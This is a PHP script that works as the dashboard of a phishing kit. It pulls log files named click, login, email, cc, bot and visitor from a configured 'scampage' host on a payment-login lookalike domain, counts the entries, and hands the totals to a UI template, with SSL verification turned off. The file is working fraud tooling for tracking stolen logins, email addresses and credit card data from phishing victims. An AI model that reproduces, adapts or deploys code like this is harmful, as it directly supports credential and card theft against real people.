<?php
// Error Handel
error_reporting(E_ALL);
ini_set('display_errors', '0');
ini_set('log_errors', '1');
ini_set('error_log', 'abnormal_error.log');

$setting = [
	'ui' => 'v2', // v1/v2
	'scam' => 'https://update.payment-login.dynv6.net/?anticode', // Link scampage
	'file' => 'abnormal.txt' // Harus sesuai dengan yang di scampage
];

$click = get("{$setting['scam']}/gacorking/click.txt");
$click = (!preg_match("/not found/i", $click)) ? count(explode("\n", $click)) : 0;

$login = get("{$setting['scam']}/gacorking/login.txt");
$login = (!preg_match("/not found/i", $login)) ? count(explode("\n", $login)) : 0;

$email = get("{$setting['scam']}/gacorking/email.txt");
$email = (!preg_match("/not found/i", $email)) ? count(explode("\n", $email)) : 0;

$cc = get("{$setting['scam']}/gacorking/cc.txt");
$cc = (!preg_match("/not found/i", $cc)) ? count(explode("\n", $cc)) : 0;

$bot = get("{$setting['scam']}/gacorking/bot.txt");
$bot = (!preg_match("/not found/i", $bot)) ? count(explode("\n", $bot)) : 0;

$visitor = get("{$setting['scam']}/gacorking/visitor.txt");
$visitor_count = (!preg_match("/not found/i", $visitor)) ? count(explode("\n", $visitor)) : 0;
$visitor = explode("\n", $visitor);

if (!file_exists("files/{$setting['ui']}.php")) sendMsg("<h1>UI not found</h1>");
require_once("files/{$setting['ui']}.php");

function sendMsg($text) {
	echo $text;exit();
}

function get($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $res = curl_exec($ch);
    return $res;
}
?>